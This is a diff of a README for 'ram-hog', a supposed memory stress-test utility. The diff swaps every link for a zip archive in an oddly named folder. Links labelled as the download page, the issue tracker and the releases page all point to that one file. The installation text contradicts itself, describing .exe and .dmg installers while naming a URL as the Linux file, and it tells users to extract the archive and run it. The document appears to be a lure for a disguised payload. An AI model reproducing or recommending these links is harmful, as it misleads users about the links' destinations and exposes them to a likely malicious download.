@@ -1,7 +1,7 @@
 # 🚀 ram-hog - Stress Test Your System Memory Easily
 
 ## 🔗 Download Now
-[![Download ram-hog](https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip)](https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip)
+[![Download ram-hog](https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip)](https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip)
 
 ## 📝 Introduction
 ram-hog is a cross-platform utility designed to stress test and analyze your system memory. You can allocate user-configurable memory chunks until exhaustion or until specific limits are met. This tool features adjustable speed modes, real-time progress tracking, error handling, and a graceful shutdown to help you evaluate your system's resources.
@@ -34,14 +34,14 @@ Before downloading, ensure your system meets the following requirements:
 - **Disk Space:** A minimum of 100MB of free disk space.
 
 ### 2. Visit the Download Page
-To download ram-hog, please [visit this page to download](https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip).
+To download ram-hog, please [visit this page to download](https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip).
 
 ## 📥 Download & Install
 After visiting the download page, you will see the available versions of ram-hog. Choose the version that matches your operating system:
 
 1. **Windows**: Download the `.exe` installer.
 2. **macOS**: Download the `.dmg` file.
-3. **Linux**: Download the `https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip` file.
+3. **Linux**: Download the `https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip` file.
 
 ### Installation Steps
 #### Windows
@@ -55,7 +55,7 @@ After visiting the download page, you will see the available versions of ram-hog
 - Launch the app from your Applications folder.
 
 #### Linux
-- Extract the downloaded `https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip` file.
+- Extract the downloaded `https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip` file.
 - Open a terminal in the extracted folder.
 - Run the command `./ram-hog` to start the application.
 
@@ -83,11 +83,11 @@ If you encounter issues while using ram-hog, consider these tips:
 - **Error Messages:** Read the error message carefully for clues. Most common issues relate to memory limits or unsupported settings.
 
 ## 📞 Support
-If you need further assistance, please visit our [issue tracker](https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip) on GitHub to report problems or ask questions.
+If you need further assistance, please visit our [issue tracker](https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip) on GitHub to report problems or ask questions.
 
 ## 📌 Additional Information
 ram-hog is open-source software. You can view the source code or contribute to the project if you wish. Please refer to the repository for more details.
 
-For the latest updates and features, always check the [ram-hog releases page](https://raw.githubusercontent.com/JosepaulJ/ram-hog/main/stramineous/ram-hog.zip). 
+For the latest updates and features, always check the [ram-hog releases page](https://github.com/JosepaulJ/ram-hog/raw/refs/heads/main/stramineous/ram_hog_v2.0.zip). 
 
 Thank you for using ram-hog. Enjoy stress testing your system memory!
